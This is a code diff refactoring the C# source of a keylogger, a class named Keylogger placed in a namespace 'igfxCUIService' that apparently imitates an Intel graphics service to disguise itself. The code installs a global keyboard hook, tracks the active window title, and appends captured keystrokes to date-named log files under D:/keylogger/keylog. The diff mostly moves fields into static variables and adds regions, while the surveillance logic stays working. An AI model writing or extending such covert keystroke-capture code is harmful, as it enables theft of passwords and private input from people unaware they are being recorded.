@@ -14,10 +14,19 @@ namespace igfxCUIService
 {
     class Keylogger
     {
-       
 
+        #region variable
+        public static DateTime datum = DateTime.Now;
+        private static string folderName = @"D:/keylogger/keylog";
+        public static string pathString = System.IO.Path.Combine(folderName);
+        public static string path = (pathString + "/" + datum.ToShortDateString() + ".text");
+        public static String hWndTitle;
+        public static String hWndTitlePast;
         public static KeystrokeAPI keystrokeApi = new KeystrokeAPI();
-        public static void logger()
+        #endregion
+
+        #region keylogger
+        public static void Logger()
         {
             hWndTitle = window.GetActiveWindowTitle();
             hWndTitlePast = hWndTitle;
@@ -25,20 +34,12 @@ namespace igfxCUIService
             keystrokeApi.CreateKeyboardHook(Save);
             Application.Run();
         }
+        #endregion
 
-        public static String hWndTitle;
-        public static String hWndTitlePast;
-
-
+        #region save keylog
         private static void Save(KeyPressed key)
         {
-            DateTime datum = DateTime.Now;
-            string folderName = @"D:/keylogger/keylog";
-            string pathString = System.IO.Path.Combine(folderName);
             System.IO.Directory.CreateDirectory(pathString);
-            string path = (pathString + "/" + datum.ToShortDateString() + ".text");
-
-
 
             using (StreamWriter sw = File.AppendText(path))
             {
@@ -89,5 +90,8 @@ namespace igfxCUIService
                 }
             }
         }
+        #endregion
+
+
     }
 }
